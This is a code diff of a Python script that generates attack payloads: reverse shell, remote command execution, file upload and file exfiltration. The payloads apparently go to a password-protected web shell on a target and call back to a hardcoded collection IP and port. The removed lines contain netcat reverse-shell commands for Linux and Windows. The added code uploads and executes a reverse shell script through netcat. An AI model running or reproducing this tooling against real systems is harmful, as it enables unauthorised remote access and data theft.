@@ -1,5 +1,4 @@
 import argparse
-import platform
 
 def main():
     parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')
@@ -8,39 +7,41 @@ def main():
     parser.add_argument('-p', type=str, default=None, help='Desired Payload: exfil', dest='payloadChoice', required=True)
     parser.add_argument('-i', type=str, default="131.151.162.100", help='collection ip address', dest='collectionIP', required=False)
     parser.add_argument('-r', type=str, default=1234, help='collection port', dest='collectionPort', required=False)
-    #parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=True)
+    parser.add_argument('-u', type=str, default="input", help='File you wish to exfil', dest='uploadFile', required=False)
+    parser.add_argument('-f', type=str, default=None, help='File you wish to exfil', dest='exfilFile', required=False)
     parser.add_argument('-a', type=str, default="ubuntux86", help='Target architecture: ubuntux86', dest='targetArch', required=False)
 
-    #Optional arguments
-    #parser.add_argument('-o', type=str, default="execute-command.sh", help='Payload output name', dest='payloadName', required=False)
-
     args = parser.parse_args()
-
-    systemVariables = {'OS': platform.system(),
-                        'Ncat': 'Ncat' if platform.system() == 'Windows' else 'Ncat',
-                        'Shell': ''}
 
     #Reverse Shell Payload
     if(args.payloadChoice == "RShell"):
         print("Reverse Shell payload generator.")
-        shellDestination = "http://131.151.162.95:63412/upload"
         variables = "pass=abc321&payload="
-        ReverseShell(systemVariables, args.collectionIP, args.collectionPort, shellDestination, variables, args.targetArch)
+        ReverseShell(args.collectionIP, args.collectionPort, variables)
 
     #Command Execution Payload
+    #Create an upload script to upload a sh file, and then after about a minute you can run the CExe file.
     if(args.payloadChoice == "CExe"):
+        variables = "pass=abc321&payload="
+        fileName = args.uploadFile
+        if(len(args.uploadFile.split('/')[:-1]) > 0):
+            fileName = fileName.split('/')[-1]
+        GenCommandExecution(fileName, variables, args.collectionIP, args.collectionPort)
         print("Execute")
 
     #File-upload Payload
     if(args.payloadChoice == "Upload"):
         variables = "pass=abc321&payload="
-        GenFileUpload("input", variables, args.collectionIP, args.collectionPort)
+        fileName = args.uploadFile
+        if(len(args.uploadFile.split('/')[:-1]) > 0):
+            fileName = fileName.split('/')[-1]
+        GenFileUpload(args.uploadFile, fileName, variables, args.collectionIP, args.collectionPort)
         print("Upload")
 
     #File-download Payload
     #The Exfil operation will download a target file from the server.
-    if(args.payloadChoice == "exfil" ):
-        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort, args.payloadName)
+    if(args.payloadChoice == "ExFil" ):
+        GenExfil(args.exfilFile, args.collectionIP, args.collectionPort)
         print("Exfil Payload Generated!")
 
     #System Information Retrieval Payload
@@ -49,30 +50,26 @@ def main():
 
     return
 
-def ReverseShell(systemVariables, collectionIP, collectionPort, shellDestination, variables, targetArch):
-    if(systemVariables['OS'] == 'Windows'):
-        newShell = "start cmd.exe @cmd /k"
-        localNetCat = f'{systemVariables["Ncat"]} -l -p {collectionPort}'
+def ReverseShell(collectionIP, collectionPort, variables):
+    variables = "pass=abc321&payload="
+    GenFileUpload("UsefulBash/ReverseShell.sh", "ReverseShell.sh", variables, collectionIP, collectionPort)
+    GenCommandExecution("ReverseShell.sh", variables, collectionIP, collectionPort)
+    return
 
-    if(targetArch == "ubuntux86"):
-        payload = "/bin/bash | nc {0} {1}".format(collectionIP, collectionPort)
-    elif(targetArch == "Windows"):
-        payload = "Ncat {0} {1} -e cmd.exe".format(collectionIP, collectionPort)
-
-    with open('CMDTemplates/RShell', 'r') as file:
-        RShellPayloadText = file.read().format(newShell, localNetCat, variables, payload.replace(' ', '%%20'), shellDestination)
-
-    f = open("RShell.cmd", "w")
-    f.write(RShellPayloadText)
+def GenCommandExecution(uploadFile, variables, collectionIP, collectionPort):
+    with open('CMDTemplates/CExe', 'r') as file:
+        ExecutionPayloadText = file.read().format(variables, uploadFile)
+    f = open("CExe.cmd", "w")
+    f.write(ExecutionPayloadText)
     f.close()
     return
 
-def GenFileUpload(uploadFile, variables, collectionIP, collectionPort):
-    uploadcmd = "nc {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
+def GenFileUpload(uploadFileDirectory, uploadFile, variables, collectionIP, collectionPort, commandFileName="Upload.cmd"):
+    uploadcmd = "nc -q 5 {0} {1} > {2}".format(collectionIP, collectionPort, uploadFile).replace(' ', "%%20")
     with open('CMDTemplates/Upload', 'r') as file:
-        UploadPayloadText = file.read().format(collectionPort, uploadFile, variables, uploadcmd)
+        UploadPayloadText = file.read().format(collectionPort, uploadFileDirectory, variables, uploadcmd, uploadFile)
 
-    f = open("Upload.cmd", "w")
+    f = open(commandFileName, "w")
     f.write(UploadPayloadText)
     f.close()
     return
@@ -81,7 +78,7 @@ def GenExfil(exfilFile, collectionIP, collectionPort):
     with open('CMDTemplates/Exfil', 'r') as file:
         ExfilPayloadText = file.read().format(exfilFile, collectionIP, collectionPort)
 
-    f = open("Exfil", "w")
+    f = open("Exfil", "w", newline='')
     f.write(ExfilPayloadText)
     f.close()
     return
